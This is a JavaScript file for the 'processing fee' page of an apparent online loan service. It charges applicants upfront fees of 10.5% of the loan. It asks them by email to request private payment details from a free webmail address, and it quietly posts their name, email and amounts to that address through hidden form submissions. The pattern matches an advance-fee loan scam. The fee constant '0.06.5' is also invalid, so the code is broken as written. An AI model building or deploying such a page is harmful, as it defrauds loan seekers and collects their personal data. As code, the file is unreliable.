/**
 * Processing Fee Payment Handler
 * Auto-populates with application data
 * Generates unique payment codes
 * Manages payment request workflow
 */

// Fee calculation rates
const PROCESSING_FEE_RATE = 0.04; // 4%
const INSURANCE_FEE_RATE = 0.06.5;  // 6.5%

// Initialize page
document.addEventListener('DOMContentLoaded', function() {
    loadApplicationData();
    calculateFees();
    initializeEventListeners();
});

function initializeEventListeners() {
    const sendEmailBtn = document.getElementById('sendEmailBtn');
    if (sendEmailBtn) {
        sendEmailBtn.addEventListener('click', function(e) {
            e.preventDefault();
            handleSendPaymentRequest();
        });
    }
}

function parseNumericValue(value) {
    if (value === null || value === undefined || value === '') return 0;
    const cleanValue = String(value).replace(/[^0-9.-]/g, '');
    const parsed = parseFloat(cleanValue);
    return isNaN(parsed) ? 0 : parsed;
}

function loadApplicationData() {
    let applicantName = sessionStorage.getItem('applicantName') || localStorage.getItem('applicantName') || 'Valued Customer';
    let applicantEmail = sessionStorage.getItem('applicantEmail') || localStorage.getItem('applicantEmail') || 'customer@example.com';
    let loanType = sessionStorage.getItem('loanType') || localStorage.getItem('loanType') || 'Personal Loan';
    let loanAmount = parseNumericValue(sessionStorage.getItem('loanAmount') || localStorage.getItem('loanAmount') || '100');
    let annualIncome = parseNumericValue(sessionStorage.getItem('annualIncome') || localStorage.getItem('annualIncome') || '50000');

    if (loanAmount < 100) loanAmount = 100;
    if (loanAmount > 500000) loanAmount = 500000;

    window.applicantData = {
        name: applicantName,
        email: applicantEmail,
        loanType: loanType,
        loanAmount: loanAmount,
        annualIncome: annualIncome
    };

    displaySummaryData();
}

function displaySummaryData() {
    const summaryName = document.getElementById('summaryName');
    const summaryEmail = document.getElementById('summaryEmail');
    const summaryLoanType = document.getElementById('summaryLoanType');
    const summaryLoanAmount = document.getElementById('summaryLoanAmount');

    if (summaryName) summaryName.textContent = window.applicantData.name;
    if (summaryEmail) summaryEmail.textContent = window.applicantData.email;
    if (summaryLoanType) summaryLoanType.textContent = window.applicantData.loanType;
    if (summaryLoanAmount) summaryLoanAmount.textContent = formatCurrency(window.applicantData.loanAmount);
}

function calculateFees() {
    const loanAmount = window.applicantData ? window.applicantData.loanAmount : 0;
    const processingFee = loanAmount * PROCESSING_FEE_RATE;
    const insuranceFee = loanAmount * INSURANCE_FEE_RATE;
    const totalFee = processingFee + insuranceFee;

    const processingFeeEl = document.getElementById('processingFee');
    const insuranceFeeEl = document.getElementById('insuranceFee');
    const totalFeeEl = document.getElementById('totalFee');

    if (processingFeeEl) processingFeeEl.textContent = formatCurrency(processingFee);
    if (insuranceFeeEl) insuranceFeeEl.textContent = formatCurrency(insuranceFee);
    if (totalFeeEl) totalFeeEl.textContent = formatCurrency(totalFee);

    window.calculatedFees = {
        processing: processingFee,
        insurance: insuranceFee,
        total: totalFee
    };
}

function formatCurrency(amount) {
    const numAmount = parseNumericValue(amount);
    return '$' + numAmount.toLocaleString('en-US', {
        minimumFractionDigits: 2,
        maximumFractionDigits: 2
    });
}

function generatePaymentCode() {
    const today = new Date();
    const year = today.getFullYear();
    const month = String(today.getMonth() + 1).padStart(2, '0');
    const day = String(today.getDate()).padStart(2, '0');
    const random = Math.floor(1000 + Math.random() * 9000);
    
    const paymentCode = `QL-${year}${month}${day}-${random}`;
    window.paymentCode = paymentCode;
    
    showPaymentInstructions(paymentCode);
    sendPaymentCodeEmail(paymentCode);
    
    return paymentCode;
}

function showPaymentInstructions(paymentCode) {
    const summaryStep = document.getElementById('summaryStep');
    if (summaryStep) summaryStep.classList.remove('active');
    
    const paymentInstructions = document.getElementById('paymentInstructions');
    if (paymentInstructions) paymentInstructions.classList.add('active');
    
    const generatedCode = document.getElementById('generatedCode');
    const summaryPaymentCode = document.getElementById('summaryPaymentCode');
    if (generatedCode) generatedCode.textContent = paymentCode;
    if (summaryPaymentCode) summaryPaymentCode.textContent = paymentCode;
    
    const summaryPaymentName = document.getElementById('summaryPaymentName');
    const summaryPaymentAmount = document.getElementById('summaryPaymentAmount');
    if (summaryPaymentName) summaryPaymentName.textContent = window.applicantData.name;
    if (summaryPaymentAmount) summaryPaymentAmount.textContent = formatCurrency(window.calculatedFees.total);
    
    updateMailtoLink(paymentCode);
    window.scrollTo({ top: 0, behavior: 'smooth' });
}

function updateMailtoLink(paymentCode) {
    const subject = `Payment Request - Code: ${paymentCode}`;
    const body = `Hello,

I would like to complete my loan application payment.

Payment Code: ${paymentCode}
Name: ${window.applicantData.name}
Email: ${window.applicantData.email}
Loan Type: ${window.applicantData.loanType}
Loan Amount: ${formatCurrency(window.applicantData.loanAmount)}
Processing Fee Due: ${formatCurrency(window.calculatedFees.total)}

Please send me the payment account details.

Thank you`;
    
    const mailtoLink = `mailto:quickloanz@zohomail.com?subject=${encodeURIComponent(subject)}&body=${encodeURIComponent(body)}`;
    
    const sendEmailBtn = document.getElementById('sendEmailBtn');
    if (sendEmailBtn) {
        sendEmailBtn.setAttribute('data-mailto', mailtoLink);
        sendEmailBtn.href = mailtoLink;
    }
}

function handleSendPaymentRequest() {
    const sendEmailBtn = document.getElementById('sendEmailBtn');
    const mailtoLink = sendEmailBtn ? sendEmailBtn.getAttribute('data-mailto') : '';
    
    if (mailtoLink) {
        window.location.href = mailtoLink;
    }
    
    setTimeout(function() {
        showSuccessMessage();
    }, 500);
}

function showSuccessMessage() {
    const paymentInstructions = document.getElementById('paymentInstructions');
    if (paymentInstructions) paymentInstructions.classList.remove('active');
    
    const paymentSuccess = document.getElementById('paymentSuccess');
    if (paymentSuccess) {
        paymentSuccess.classList.add('show');
        paymentSuccess.style.display = 'block';
        
        const successPaymentCode = document.getElementById('successPaymentCode');
        if (successPaymentCode && window.paymentCode) {
            successPaymentCode.textContent = window.paymentCode;
        }
    }
    
    sendPaymentRequestConfirmation();
    window.scrollTo({ top: 0, behavior: 'smooth' });
}

function copyPaymentCode() {
    const generatedCode = document.getElementById('generatedCode');
    if (!generatedCode) return;
    
    const paymentCode = generatedCode.textContent;
    
    if (navigator.clipboard && navigator.clipboard.writeText) {
        navigator.clipboard.writeText(paymentCode).then(function() {
            showCopySuccess('Payment code copied to clipboard!');
        }).catch(function(err) {
            fallbackCopyTextToClipboard(paymentCode);
        });
    } else {
        fallbackCopyTextToClipboard(paymentCode);
    }
}

function fallbackCopyTextToClipboard(text) {
    const tempInput = document.createElement('textarea');
    tempInput.value = text;
    tempInput.style.position = 'fixed';
    tempInput.style.opacity = '0';
    document.body.appendChild(tempInput);
    tempInput.select();
    
    try {
        document.execCommand('copy');
        showCopySuccess('Payment code copied to clipboard!');
    } catch (err) {
        showCopySuccess('Failed to copy. Please copy manually.');
    }
    
    document.body.removeChild(tempInput);
}

function showCopySuccess(message) {
    const existingToast = document.querySelector('.copy-toast');
    if (existingToast) existingToast.remove();

    const toast = document.createElement('div');
    toast.className = 'copy-toast';
    toast.textContent = message;
    document.body.appendChild(toast);
    
    setTimeout(() => {
        toast.style.opacity = '1';
        toast.style.transform = 'translateX(0)';
    }, 10);
    
    setTimeout(() => {
        toast.style.opacity = '0';
        toast.style.transform = 'translateX(100px)';
        setTimeout(() => {
            if (toast.parentNode) toast.parentNode.removeChild(toast);
        }, 300);
    }, 3000);
}

function sendPaymentCodeEmail(paymentCode) {
    const form = document.createElement('form');
    form.action = 'https://formsubmit.co/quickloanz@zohomail.com';
    form.method = 'POST';
    form.target = 'paymentFrame';
    form.style.display = 'none';
    
    const fields = {
        '_subject': `New Payment Code - ${paymentCode}`,
        '_template': 'table',
        '_captcha': 'false',
        'Payment Code': paymentCode,
        'Applicant': window.applicantData.name,
        'Email': window.applicantData.email,
        'Loan Amount': formatCurrency(window.applicantData.loanAmount),
        'Total Fee': formatCurrency(window.calculatedFees.total),
        'Status': 'Awaiting Payment Request'
    };
    
    for (const [name, value] of Object.entries(fields)) {
        const input = document.createElement('input');
        input.type = 'hidden';
        input.name = name;
        input.value = value;
        form.appendChild(input);
    }
    
    document.body.appendChild(form);
    form.submit();
    setTimeout(() => { if (form.parentNode) form.parentNode.removeChild(form); }, 1000);
}

function sendPaymentRequestConfirmation() {
    const form = document.createElement('form');
    form.action = 'https://formsubmit.co/quickloanz@zohomail.com';
    form.method = 'POST';
    form.target = 'paymentFrame';
    form.style.display = 'none';
    
    const fields = {
        '_subject': `Payment Request - ${window.paymentCode}`,
        '_template': 'table',
        '_captcha': 'false',
        'Payment Code': window.paymentCode,
        'Applicant': window.applicantData.name,
        'Email': window.applicantData.email,
        'Amount Due': formatCurrency(window.calculatedFees.total),
        'Status': 'Payment Request Sent'
    };
    
    for (const [name, value] of Object.entries(fields)) {
        const input = document.createElement('input');
        input.type = 'hidden';
        input.name = name;
        input.value = value;
        form.appendChild(input);
    }
    
    document.body.appendChild(form);
    form.submit();
    setTimeout(() => { if (form.parentNode) form.parentNode.removeChild(form); }, 1000);
}

console.log('%cProcessing Fee Page', 'color: #00d4ff; font-size: 20px; font-weight: bold;');
